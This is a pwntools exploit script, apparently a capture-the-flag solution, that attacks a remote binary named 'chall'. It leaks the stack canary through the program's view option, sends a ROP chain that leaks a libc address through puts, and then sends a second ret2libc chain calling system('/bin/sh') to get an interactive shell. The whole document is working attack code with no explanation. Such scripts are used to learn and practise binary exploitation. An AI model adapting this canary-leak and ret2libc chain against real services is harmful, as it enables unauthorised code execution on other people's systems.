#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

# r = process("./chall")
if len(sys.argv) != 3:
    print(f"{sys.argv[0]} HOST PORT")
    exit(255)

r = remote(sys.argv[1], int(sys.argv[2]))

def create(idx, sz, msg):
    r.sendlineafter(b"choose: ", b"1")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", str(sz).encode())
    r.sendlineafter(b": ", msg)

def view(idx, decrypt=True):
    r.sendlineafter(b"choose: ", b"2")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b"): ", b"y" if decrypt else b"n")
    return r.recvuntil(b"1. CREATE", drop=True)

create(0, 16, b"\x00" * 15)
canary = (u64(view(0, False)[:8]) >> 8) << 8
print(f"canary {canary:x}")

# make sure puts is resolved
r.sendlineafter(b": ", b"0")

POP_RDI = 0x4012b1
main = 0x40190e
puts = 0x401100
GOT_puts = 0x404020

payload = b"0"
payload += b"\x00" * (0x16-8-1)
payload += p64(canary)
payload += p64(canary)
payload += p64(POP_RDI)
payload += p64(GOT_puts)
payload += p64(puts)
payload += p64(main)

r.sendlineafter(b": ", payload)

libc_puts = u64(r.recvline(0) + b"\x00\x00")
libc = libc_puts - 0x80e50
libc_system = libc+0x50d70
libc_binsh = libc+0x1d8678

payload = b"0"
payload += b"\x00" * (0x16-8-1)
payload += p64(canary)
payload += p64(canary)
payload += p64(POP_RDI)
payload += p64(libc_binsh)
payload += p64(POP_RDI+1)
payload += p64(libc_system)

# gdb.attach(r, "b *0x004014d6")
# pause()

r.sendlineafter(b": ", payload)
r.interactive()
